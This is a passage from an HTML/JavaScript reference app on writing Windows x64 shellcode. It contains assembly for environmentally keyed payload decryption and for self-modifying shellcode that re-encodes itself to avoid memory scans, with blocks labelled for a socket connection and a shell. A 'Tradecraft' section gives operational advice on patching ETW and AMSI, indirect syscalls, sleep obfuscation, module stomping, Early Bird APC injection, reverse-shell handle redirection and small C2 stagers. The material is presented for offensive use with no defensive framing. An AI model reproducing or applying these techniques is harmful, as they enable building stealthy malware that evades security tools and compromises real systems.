{t:"Environmental keying (x64 ASM)",l:"asm",c:"; Environmental Keying: shellcode only decrypts on target machine\n; Key derived from hostname hash\n\nenv_keyed_shellcode:\n    sub rsp, 0x120\n\n    ; Get hostname\n    lea rcx, [rsp]              ; lpBuffer\n    lea rdx, [rsp+0x100]       ; lpnSize\n    mov dword [rdx], 0x100\n    call [resolved_GetComputerNameA]\n\n    ; Hash hostname (DJB2)\n    lea rsi, [rsp]              ; hostname string\n    mov eax, 5381               ; DJB2 seed\n.hash:\n    movzx ecx, byte [rsi]\n    test cl, cl\n    jz .hash_done\n    imul eax, eax, 33\n    add eax, ecx\n    inc rsi\n    jmp .hash\n.hash_done:\n    ; EAX = hash of hostname = decryption key\n\n    ; Use hash as XOR key to decrypt payload\n    lea rsi, [rip+keyed_payload]\n    mov ecx, PAYLOAD_LEN\n    mov edx, eax                ; 4-byte key\n.decrypt:\n    xor dword [rsi], edx       ; XOR 4 bytes at a time\n    add rsi, 4\n    sub ecx, 4\n    jg .decrypt\n\n    jmp keyed_payload           ; execute (only correct on target host)\n\nkeyed_payload:\n    ; db ... (encrypted with hash of target hostname)\n\n; Build-time: compute DJB2(\"TARGETHOST\") and XOR-encrypt payload with it\n; Wrong host = wrong hash = garbage decryption = crash or NOP"},
{t:"Self-modifying shellcode (decode-execute-reencode)",l:"asm",c:"; Self-modifying: only one block decoded at a time\n; Blocks are decoded, executed, re-encoded before next block\n; Memory scanner sees mostly encrypted bytes at any point\n\nself_modify:\n    lea r12, [rip+blocks]       ; base of encoded blocks\n    xor r13, r13                ; block index = 0\n    mov r14d, NUM_BLOCKS        ; total blocks\n\n.next_block:\n    cmp r13d, r14d\n    jge .done\n\n    ; Calculate block address\n    lea rsi, [r12 + r13*BLOCK_SIZE]\n\n    ; Decode block (XOR with block-specific key)\n    mov ecx, BLOCK_SIZE\n    mov al, [rip+block_keys + r13]  ; per-block key\n.decode:\n    xor byte [rsi], al\n    inc rsi\n    loop .decode\n\n    ; Execute decoded block\n    lea rax, [r12 + r13*BLOCK_SIZE]\n    call rax\n\n    ; Re-encode block (same XOR = toggle)\n    lea rsi, [r12 + r13*BLOCK_SIZE]\n    mov ecx, BLOCK_SIZE\n    mov al, [rip+block_keys + r13]\n.reencode:\n    xor byte [rsi], al\n    inc rsi\n    loop .reencode\n\n    ; Next block\n    inc r13d\n    jmp .next_block\n\n.done:\n    ret\n\nblock_keys:\n    db 0x41, 0x5A, 0x7E, 0x33  ; unique key per block\n\nblocks:\n    ; Each block: BLOCK_SIZE bytes, XOR-encoded\n    ; Block 0: resolve APIs\n    ; Block 1: setup socket\n    ; Block 2: connect + shell\n    ; Block 3: cleanup"}
];
return C[s]||[];
}
var TR={
pic:[
{t:"x64 RIP-relative eliminates the delta offset trick",d:"In x86 shellcode, you needed 'call $+5; pop ebx' to get your current address. x64 has native RIP-relative addressing: 'lea rax, [rip+offset]' gives you any data address relative to the current instruction. Always use LEA, never absolute MOV."},
{t:"Stack alignment is the #1 cause of shellcode crashes",d:"x64 Windows requires RSP to be 16-byte aligned at the CALL target (not at the caller). CALL pushes 8 bytes (return address), so RSP must be 16-byte aligned BEFORE the CALL, meaning 8-byte aligned after your function prologue. Sub rsp, 0x28 is the magic number: 0x20 shadow + 0x8 alignment."},
{t:"Use 32-bit register ops to avoid REX prefixes and nulls",d:"'xor eax, eax' (2 bytes: 31 C0) vs 'xor rax, rax' (3 bytes: 48 31 C0). The 32-bit operation zero-extends to 64-bit in x64. Use 32-bit ops whenever the upper 32 bits don't matter. Saves bytes and avoids potential null bytes in REX prefixes."},
{t:"Test PIC by running from two different base addresses",d:"After building shellcode, load it at two different addresses and verify identical behavior. If it works at 0x10000 but crashes at 0x20000, you have an absolute address reference somewhere. VirtualAlloc at specific addresses to test."}
],
api:[
{t:"Module order in InMemoryOrderModuleList is deterministic",d:"Entry order: 1) current EXE, 2) ntdll.dll, 3) kernel32.dll. This is consistent across Windows versions. Two lodsq from the list head gives you kernel32. Ntdll is one lodsq. Don't walk furtherorder after kernel32 varies."},
{t:"Combine DLL hash + function hash for collision safety",d:"ROR13 of 'LoadLibraryA' alone could collide with a function in a different DLL. Use: hash = ror13(dll_name) + ror13(function_name). Pre-compute at build time, verify no collisions against your target DLL set."},
{t:"Once you have GetProcAddress + LoadLibraryA, you can resolve anything",d:"These two functions are the bootstrap pair. LoadLibraryA loads any DLL into the process. GetProcAddress resolves any export. PEB walking is only needed to find these two in kernel32. Everything else goes through them."},
{t:"Export table forwarding can break your walk",d:"Some exports in kernel32 forward to ntdll (e.g., kernel32!HeapAlloc  ntdll!RtlAllocateHeap). The function RVA points to a string like 'ntdll.RtlAllocateHeap' instead of code. Check if RVA falls within the export directory boundsif so, it's forwarded."}
],
pat:[
{t:"Always use WSASocketA, not socket()",d:"WSASocketA with dwFlags=0 returns a clean socket handle. The CRT socket() function may add WSA_FLAG_OVERLAPPED which can cause issues. WSASocketA gives direct control over socket creation."},
{t:"Push sockaddr_in carefully to avoid null bytes in IP/port",d:"IP 0.0.0.0 and port 0 contain null bytes. For 127.0.0.1 (0x7F000001): bytes 00 are present. Construct via XOR: push 0xFEFFFF80; xor dword [rsp], 0xFFFFFF81 = 0x0100007F. Same trick for ports with null bytes."},
{t:"Egghunters only work if payload is somewhere in process memory",d:"The egg must be in a readable memory region. Common scenarios: overflow buffer is small, but another input (HTTP body, environment variable) holds the full payload. Egghunter scans all readable pages to find it."},
{t:"CreateProcess STARTUPINFO redirection is key for reverse shells",d:"Set dwFlags = STARTF_USESTDHANDLES. Set hStdInput, hStdOutput, hStdError to the socket handle. cmd.exe inherits these handles and all I/O flows through the socket. STARTUPINFOA is 104 bytesallocate on stack."}
],
enc:[
{t:"Single-byte XOR fails if any plaintext byte equals the key",d:"byte XOR key = 0x00 (null). If your shellcode contains the byte 0x41 and key is 0x41, encoded output has a null. Test all 256 keys, pick one with no collisions. Python: assert key not in shellcode."},
{t:"Entropy above 7.5 bits/byte flags many sandboxes",d:"Encrypted shellcode has near-maximum entropy (~7.99). Defenders use Shannon entropy to flag suspicious memory regions and PE sections. Counter: interleave with low-entropy data (padding with English text) or use encoding that maintains lower entropy."},
{t:"Decoder stub itself must be null-free and signature-resistant",d:"The decoder is the only plaintext portion. If it matches known signatures (Metasploit XOR decoder), it's detected. Use polymorphic generation: randomize registers, insert junk, reorder independent instructions, use equivalent instruction sequences."},
{t:"RC4 is the sweet spot for shellcode crypters",d:"Small state (256 bytes), simple implementation in ASM (~100 bytes for KSA+PRGA), real encryption (not just XOR), no padding requirements. AES needs larger stubs or API resolution. RC4 stub fits in tight shellcode budgets."}
],
sys:[
{t:"SSNs change every Windows buildnever hardcode for production",d:"SSN for NtAllocateVirtualMemory: 0x18 on 22H2, different on 23H2. Hardcoded SSNs break on updates. Use Hell's Gate or SortedSyscalls for runtime resolution. Only hardcode for targeted, single-build engagements."},
{t:"Indirect syscalls fix the call stack problem",d:"EDR validates that syscall return addresses come from ntdll. Direct syscalls leave your RWX shellcode address on the stack. Indirect syscalls (jmp to ntdll's syscall;ret gadget) make the stack trace look legitimate. Always prefer indirect."},
{t:"SortedSyscalls needs zero prior knowledge",d:"Enumerate all Zw* exports from ntdll, sort by address. The position in the sorted list equals the SSN. Works because syscall stubs in ntdll are laid out in SSN order. No need to read stub bytes (works even if fully hooked)."},
{t:"Hell's Gate reads SSN even from hooked stubs",d:"EDR hooks overwrite the first few bytes (typically the mov r10,rcx). But the 'mov eax, SSN' at offset +4 is usually preserved. Hell's Gate checks for the expected pattern and falls back to Halo's Gate (neighbor walking) if fully overwritten."}
],
evd:[
{t:"Patch ETW before doing anything suspicious",d:"ETW events fire on VirtualAlloc, process creation, thread creation, etc. Patch EtwEventWrite at the very start of your shellcode. One byte (0xC3 = ret) is sufficient. All .NET and PowerShell logging also goes through ETW."},
{t:"AMSI patch bytes are heavily signaturedvary them",d:"The classic B8 57 00 07 80 C3 patch is well-known. Alternatives: patch AmsiOpenSession instead (less monitored), write a conditional jump over the scan logic, or corrupt the AMSI context handle in the provider structure."},
{t:"Sleep obfuscation is critical for long-running implants",d:"A beacon sleeping 60 seconds with plaintext shellcode in RWX memory is trivially found by periodic memory scanning. Encrypt your memory region before sleep, change protection to PAGE_NOACCESS, decrypt on wake. Timer callbacks handle the wake-decrypt cycle."},
{t:"Heaven's Gate is dated but still works against 32-bit hooks",d:"Most EDR hooks target ntdll. Heaven's Gate jumps from 32-bit mode to 64-bit mode, completely bypassing the 32-bit ntdll hook layer. Complex to implement but devastating against WoW64 monitoring. Less relevant for native 64-bit shellcode."}
],
ldr:[
{t:"Callbacks avoid CreateThreadone of the most monitored APIs",d:"CreateThread and NtCreateThreadEx are among the most hooked APIs. Callback-based execution (EnumFonts, timers, etc.) uses existing threads and normal API patterns. The callback prototype must match or be compatible with your shellcode entry."},
{t:"Module stomping gives your shellcode a legitimate memory backing",d:"Memory scanners check if executable regions are backed by a file on disk. Module stomping overwrites a loaded DLL's .text section with shellcode. The memory region appears backed by a legitimate DLLevades unbacked-code detection."},
{t:"Shellcode entry must handle any calling convention",d:"Thread entry gets lpParameter in RCX. APC entry gets three args. Callback entry varies per API. Best practice: your shellcode entry ignores all parameters, saves all non-volatile registers, and sets up its own stack frame. Universal compatibility."},
{t:"Early Bird APC runs before EDR hooks are installed",d:"Create a suspended process, queue an APC to the main thread, resume. The APC runs before the process entry pointwhich means before most EDR DLLs are loaded and hooked. Timing advantage for evasion."}
],
kit:[
{t:"objdump -b binary is essential for validating raw shellcode",d:"After extracting to .bin, always disassemble with objdump to verify: correct instruction encoding, no unintended null bytes, proper control flow, and expected size. This is your primary QA tool."},
{t:"FASM can produce raw binary directlyno objcopy needed",d:"Put 'format binary' and 'use64' at the top of your FASM source. Output is directly the shellcode bytes. No object format wrapper, no section extraction. Simplifies the build pipeline for pure shellcode."},
{t:"Donut handles the hard parts of converting .NET to shellcode",d:"Writing a .NET assembly? Donut converts it to PIC shellcode with built-in AMSI bypass, WLDP bypass, compression, and encryption. Use Donut for rapid prototyping; write custom shellcode for stealth operations."},
{t:"Bad character testing: run all 256 bytes through your injection path",d:"Before deploying, generate a 256-byte test blob (0x00-0xFF) and send it through your injection vector. Compare what arrives in memory. Missing or corrupted bytes are bad characters your shellcode must avoid."}
],
adv:[
{t:"Environmental keying guarantees sandbox gets nothing",d:"Derive the decryption key from the target's hostname, domain, username, or MAC address. Compute the hash at build time, encrypt payload with it. On the wrong machine, the wrong hash produces garbage. Sandbox analysis reveals zero useful indicators."},
{t:"Self-modifying shellcode defeats point-in-time memory scans",d:"If an EDR scans memory periodically, it might catch your decoded shellcode. Self-modifying shellcode decodes one block, executes it, re-encodes it before decoding the next block. At any given moment, most of the shellcode is encrypted."},
{t:"PIC-C is faster to write than ASM for complex logic",d:"For shellcode that needs complex logic (parsing, crypto, protocol handling), writing in C with PIC constraints is much faster than hand-crafted ASM. Use -nostdlib, resolve all APIs via PEB, put strings on stack. sRDI can wrap the result."},
{t:"Custom stager < 2KB keeps injection buffer small",d:"Many injection points have limited buffer space. A tiny stager that connects to C2 and loads a second stage keeps the initial shellcode small. Second stage can be arbitrarily large since it's loaded into freshly allocated memory."}
]
};
function render(){
var si=SE.findIndex(function(x){return x.id===S.s}),so=SE[si];
var codes=getCodes(S.s),tricks=TR[S.s]||[];
var flow='';
if(S.s==='pic')flow=fPIC();else if(S.s==='api')flow=fAPI();else if(S.s==='pat')flow=fPAT();
else if(S.s==='enc')flow=fENC();else if(S.s==='sys')flow=fSYS();else if(S.s==='evd')flow=fEVD();
else if(S.s==='ldr')flow=fLDR();else if(S.s==='kit')flow=fKIT();else if(S.s==='adv')flow=fADV();
var chtml=codes.length===0?'<div style="color:#4b5563;padding:16px;text-align:center">No code examples.</div>':
codes.map(function(c,i){return'<div class="cp" data-ci="'+i+'"><button class="ct2"><span class="cv">&#9654;</span><span class="tl">'+c.t+'</span>'+T(c.l,"#6b7280",1)+'</button></div>'}).join('');
var thtml=tricks.length===0?'':
'<div style="font-size:.68em;font-weight:800;color:#f97316;letter-spacing:.08em;margin-bottom:6px">TRADECRAFT</div>'+
tricks.map(function(t,i){return'<div class="ti" data-ti="'+i+'"><button class="tt"><span class="cv" style="color:#f97316;font-size:10px">&#9654;</span><span class="tn">'+t.t+'</span></button></div>'}).join('');
var pv=si>0?'<button class="nb2" data-nv="'+SE[si-1].id+'">\u2190 '+SE[si-1].l+'</button>':'';
var nx=si<SE.length-1?'<button class="nb2" data-nv="'+SE[si+1].id+'">'+SE[si+1].l+' \u2192</button>':'';
$('#app').innerHTML=
'<div class="hd"><div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;margin-bottom:6px"><div><h1>Shellcode Development Reference (Windows x64)</h1><div class="sub">PIC \u2022 PEB Walk \u2022 Patterns \u2022 Encoding \u2022 Syscalls \u2022 Evasion \u2022 Loaders \u2022 Toolkit \u2022 Advanced</div></div></div><div class="st">'+
SE.map(function(s){return'<button class="sb'+(S.s===s.id?' on':'')+'" style="'+(S.s===s.id?'color:'+s.c+';border-bottom-color:'+s.c:'')+'" data-sc="'+s.id+'">'+s.i+' '+s.l+'</button>'}).join('')+
'</div></div><div class="ut"><button class="ub'+(S.t==='flow'?' on':'')+'" data-tb="flow">\u{1F4CA} Flow</button><button class="ub'+(S.t==='code'?' on':'')+'" data-tb="code">\u{1F4BB} Code'+(codes.length?' <span class="cnt">'+codes.length+'</span>':'')+'</button><button class="ub'+(S.t==='tricks'?' on':'')+'" data-tb="tricks">\u{1F510} Tradecraft'+(tricks.length?' <span class="cnt">'+tricks.length+'</span>':'')+'</button></div>'+
'<div class="ct"><div style="display:flex;align-items:center;gap:6px;margin-bottom:6px"><span style="font-size:1em">'+so.i+'</span><h2 style="font-size:.9em;font-weight:700">'+so.l+'</h2>'+T(so.l,so.c)+'<div style="margin-left:auto;display:flex;gap:3px">'+pv+nx+'</div></div>'+
'<div id="tf" style="'+(S.t!=='flow'?'display:none':'')+'">'+flow+'</div>'+
'<div id="tc" style="'+(S.t!=='code'?'display:none':'')+'">'+chtml+'</div>'+
'<div id="tt" style="'+(S.t!=='tricks'?'display:none':'')+'">'+thtml+'</div></div>'+
'<div class="ft">'+[{c:"#60a5fa",l:"PIC"},{c:"#34d399",l:"API Resolution"},{c:"#a78bfa",l:"Patterns"},{c:"#fbbf24",l:"Encoding"},{c:"#f87171",l:"Syscalls"},{c:"#e879f9",l:"Evasion"},{c:"#f59e0b",l:"Loaders"},{c:"#f472b6",l:"Toolkit"},{c:"#fb923c",l:"Advanced"}].map(function(x){return'<div style="display:flex;align-items:center;gap:3px"><span class="dt" style="background:'+x.c+'"></span><span style="color:#4b5563">'+x.l+'</span></div>'}).join('')+'</div>';
$$('[data-sc]').forEach(function(b){b.onclick=function(){S.s=b.dataset.sc;S.t='flow';render()}});
$$('[data-tb]').forEach(function(b){b.onclick=function(){S.t=b.dataset.tb;render()}});
$$('[data-nv]').forEach(function(b){b.onclick=function(){S.s=b.dataset.nv;S.t='flow';render()}});
$$('.cp').forEach(function(p){
p.querySelector('.ct2').onclick=function(){
var ex=p.querySelector('.cb'),cv=p.querySelector('.cv');
if(ex){ex.remove();cv.classList.remove('op');return}
cv.classList.add('op');
var ci=parseInt(p.dataset.ci),c=codes[ci];
var pre=document.createElement('pre');pre.className='cb mono';
pre.innerHTML=c.c.split('\n').map(function(line){
var ci2=line.indexOf('//');if(ci2<0)ci2=line.indexOf(';');if(ci2<0)ci2=line.indexOf('#');
if(ci2>=0)return esc(line.slice(0,ci2))+'<span class="cm">'+esc(line.slice(ci2))+'</span>';
return esc(line);
}).join('\n');
p.appendChild(pre);};
});
$$('.ti').forEach(function(p){
p.querySelector('.tt').onclick=function(){
var ex=p.querySelector('.td'),cv=p.querySelector('.cv');
if(ex){ex.remove();p.classList.remove('op');cv.classList.remove('op');return}
p.classList.add('op');cv.classList.add('op');
var ti=parseInt(p.dataset.ti);
var div=document.createElement('div');div.className='td';div.textContent=tricks[ti].d;
p.appendChild(div);};
});
}
render();
</script>
</body>
</html>
